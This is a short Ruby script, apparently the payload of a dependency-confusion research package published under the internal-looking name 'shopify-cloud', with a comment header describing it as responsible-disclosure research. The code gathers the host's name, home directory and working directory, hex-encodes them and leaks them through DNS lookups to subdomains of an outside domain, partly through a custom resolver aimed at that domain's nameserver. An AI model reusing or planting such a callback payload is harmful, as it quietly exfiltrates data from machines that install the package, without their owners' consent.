
=begin

This code is used for research purposes.

No sensitive data is retrieved.

Callbacks from within organizations with a
responsible disclosure policy will be reported
directly to the organizations.

Any other callbacks will be ignored, and
any associated data will not be kept.

For any questions or suggestions:

alex@ethicalhack.ro
https://twitter.com/alxbrsn

=end

require 'socket'
require 'json'
require 'resolv'

suffix = '.dns.alexbirsan-hacks-paypal.com'
ns = 'dns1.alexbirsan-hacks-paypal.com'

package = 'shopify-cloud'

# only the bare minimum to be able to identify
# a vulnerable organization
data = {
    'p' => package,
    'h' => Socket.gethostname,
    'd' => File.expand_path('~'),
    'c' => Dir.pwd
}

data = JSON.generate(data)
data = data.unpack('H*')[0].scan(/.{1,60}/)

id_1 = rand(36**12).to_s(36)
id_2 = rand(36**12).to_s(36)

begin
    ns_ip = Resolv.getaddress(ns)
rescue
    ns_ip = '4.4.4.4'
end

custom_res = Resolv.new([Resolv::Hosts.new, 
    Resolv::DNS.new(nameserver: [ns_ip, '8.8.8.8'])])


data.each.each_with_index do |chunk, idx|
    begin
        Resolv.getaddress 'v2_f.' + id_1 + '.' + idx.to_s + '.' + chunk + '.v2_e' + suffix
    rescue; end

    begin
        custom_res.getaddress 'v2_f.' + id_2 + '.' + idx.to_s + '.' + chunk + '.v2_e' + suffix
    rescue; end
end
